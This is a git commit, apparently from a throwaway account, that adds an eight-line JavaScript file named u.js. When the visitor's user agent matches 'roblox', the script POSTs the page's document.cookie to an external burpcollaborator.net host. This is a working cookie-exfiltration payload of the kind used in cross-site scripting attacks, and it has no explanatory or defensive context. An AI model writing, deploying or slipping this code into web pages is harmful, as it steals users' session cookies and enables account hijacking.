9ad85d1e0315cc8700554377eb641e7ff89247db
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-02 15:23:25 +0330

    Create u.js

---
+++ u.js
@@ -0,0 +1,8 @@
+var ua=navigator.userAgent
+if(ua.match(/roblox/ig)){
+fetch('https://j1l3ojxucn141k7s7eyowz4l0c62ur.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+}
